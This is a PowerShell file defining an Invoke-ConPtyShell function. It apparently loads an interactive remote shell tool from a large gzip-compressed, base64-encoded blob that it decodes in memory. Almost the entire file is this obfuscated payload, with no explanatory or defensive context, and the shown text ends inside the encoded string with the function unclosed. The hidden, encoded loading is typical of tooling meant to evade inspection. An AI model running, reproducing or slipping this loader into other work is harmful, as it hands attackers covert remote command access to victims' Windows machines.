function Invoke-ConPtyShell
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = " "
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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